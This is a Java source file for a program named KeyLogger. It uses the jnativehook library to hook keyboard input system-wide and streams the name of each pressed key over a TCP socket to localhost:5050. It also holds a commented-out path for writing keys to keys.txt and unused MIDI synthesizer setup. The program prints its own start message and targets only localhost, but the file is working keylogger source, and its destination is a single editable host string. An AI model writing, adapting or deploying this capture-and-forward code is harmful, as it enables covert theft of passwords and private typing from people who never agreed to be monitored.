package ge.vakho;

import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.UnknownHostException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.logging.Level;

import javax.net.ssl.SSLSocket;
import javax.sound.midi.Instrument;
import javax.sound.midi.MidiChannel;
import javax.sound.midi.MidiSystem;
import javax.sound.midi.MidiUnavailableException;
import javax.sound.midi.Synthesizer;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;


/**
 * @author vakho
 */
public class KeyLogger implements NativeKeyListener {

	private static final Path file = Paths.get("keys.txt");
	private static Socket clientSocket;
	//private static ServerSocket serverSocket;
	private static PrintWriter out;

	private static boolean state = false;
	private static int lastkey = -1;

	private static Synthesizer midiSynth;
	private static MidiChannel channel;

	public static void main(String[] args) {
		System.out.println("Start");

		try {
			//serverSocket = new ServerSocket(5051);
        	//clientSocket = serverSocket.accept();
			clientSocket = new Socket("localhost", 5050);
			out = new PrintWriter(clientSocket.getOutputStream(), true);

		} catch (Exception e1) {
			e1.printStackTrace();
		}
		
		System.out.println("Key logger has been started");

		init();

		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {
			System.out.println(e.getMessage());
			System.exit(-1);
		}

		GlobalScreen.addNativeKeyListener(new KeyLogger());


        try {
			midiSynth = MidiSystem.getSynthesizer(); 
			midiSynth.open();
		} catch (MidiUnavailableException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
    
        //get and load default instrument and channel lists
        Instrument[] instr = midiSynth.getDefaultSoundbank().getInstruments();
        MidiChannel[] mChannels = midiSynth.getChannels();
        
        System.out.println(midiSynth.loadInstrument(instr[20]));//load an instrument
    
    
        channel = mChannels[0];
		channel.programChange(19);
	}

	private static void init() {
		
		// Get the logger for "org.jnativehook" and set the level to warning.
		java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
		logger.setLevel(Level.WARNING);

		// Don't forget to disable the parent handlers.
		logger.setUseParentHandlers(false);
	}

	public void nativeKeyPressed(NativeKeyEvent e) {
		String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
		int code = e.getKeyCode();
		
		/*try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE,
				StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {
			System.out.println("Down [" + keyText + "]");
			//out.println( keyText);sssssdddffrrffffrrf
		} catch (IOException ex) {
			System.out.println(ex.getMessage());
			System.exit(-1);
		}*/

		if(!state || lastkey != code){
			//channel.noteOn(code+20, 100);
			System.out.println( "Down " + keyText);
			state = true;
			out.println(keyText);
		}
	}

	public void nativeKeyReleased(NativeKeyEvent e) {
		String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
		if(state){
			//channel.allNotesOff();
			System.out.println("Up " + keyText);
			//out.println(keyText);
			state = false;
		}
	}

	public void nativeKeyTyped(NativeKeyEvent e) {
	}
}
